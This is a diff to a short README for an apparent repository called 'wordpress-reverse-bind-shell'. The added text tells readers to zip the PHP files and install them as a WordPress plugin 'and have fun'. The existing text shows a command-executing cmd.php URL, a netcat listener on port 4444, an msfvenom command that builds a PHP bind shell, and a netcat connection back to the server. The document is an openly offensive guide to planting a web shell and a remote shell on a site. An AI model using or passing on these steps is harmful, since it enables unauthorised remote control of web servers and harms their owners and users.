@@ -1,5 +1,7 @@
 # wordpress-reverse-bind-shell
 
+Update the current php files, and then create a zip file with whole folder. Install as plugin in wordpress, and have fun...
+
 ## 1st option
 http://server.fun/wordpress/wp-content/plugins/wordpress-reverse-bind-shell/cmd.php?cmd=whoami
 
@@ -12,6 +14,8 @@ nc -lvnp 4444
 msfvenom -p php/bind_php -f raw LPORT=4444 -o bind.php
 
 nc server.fun 4444
+
+
 
 ## ToDo
 More details...
